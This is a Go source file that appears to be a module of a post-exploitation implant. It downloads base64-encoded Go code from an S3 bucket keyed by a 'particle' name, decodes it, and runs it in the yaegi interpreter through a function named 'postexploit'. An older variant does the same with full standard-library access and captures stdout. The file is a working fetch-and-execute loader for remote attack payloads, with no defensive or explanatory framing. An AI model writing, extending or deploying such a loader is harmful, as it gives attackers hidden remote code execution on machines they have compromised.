package main

import (
    "github.com/traefik/yaegi/interp"
    "github.com/traefik/yaegi/stdlib"
	"os"
	"io"
	"io/ioutil"
	"bytes"
	"context"

	"github.com/aws/aws-sdk-go-v2/aws"
    "github.com/aws/aws-sdk-go-v2/config"
    "github.com/aws/aws-sdk-go-v2/credentials"
    "github.com/aws/aws-sdk-go-v2/service/s3"
)

func runGoCode(code string) string {
	i := interp.New(interp.Options{})

	_, err := i.Eval(code)
	if err != nil {
		return err.Error()
	}

	v, err := i.Eval("foo.postexploit")
	if err != nil {
		return err.Error()
	}

	//postexploit := v.Interface().(func(string) string)
	postexploit := v.Interface().(func() string)

	r := postexploit()
	return r
}


func runGoCodeOld(code string) string {
	// STDOut
	originalStdout := os.Stdout
	r, w, _ := os.Pipe()
	os.Stdout = w

	// Code Execution
	i := interp.New(interp.Options{})
	i.Use(stdlib.Symbols)

    _, err := i.Eval(code)
    if err != nil {
        return "Failure to run the code " + err.Error()
    }

	// Standart Output
	w.Close()
	os.Stdout = originalStdout
	
	var buf bytes.Buffer
	io.Copy(&buf, r)
	output := buf.String()

	return output
}

func grabFunctionCode (codeKey string, particleName string, bucket string) string {
	//region := "us-east-1"

    cfg, err := config.LoadDefaultConfig(context.TODO(),
        config.WithRegion(region),
        config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, "")),
    )
    if err != nil {
        return "Error Creating S3 Client: " + err.Error()
	}

    s3Client := s3.NewFromConfig(cfg)

    getObjectOutput, err := s3Client.GetObject(context.TODO(), &s3.GetObjectInput{
        Bucket: aws.String(bucket),
        Key:    aws.String(particleName + "/" + codeKey),
    })

    if err == nil {
        defer getObjectOutput.Body.Close()
        encodedString, err := ioutil.ReadAll(getObjectOutput.Body)

		if err == nil {
			code, err := decodeBase64(string(encodedString))
			if err == nil {
            	return code
			
			} else {
				return err.Error()
			}
			

        } else {
            return "Error Decoding code: " + err.Error()
        }

    }else{
        return "Error Downloading file: "+ err.Error()
    }
}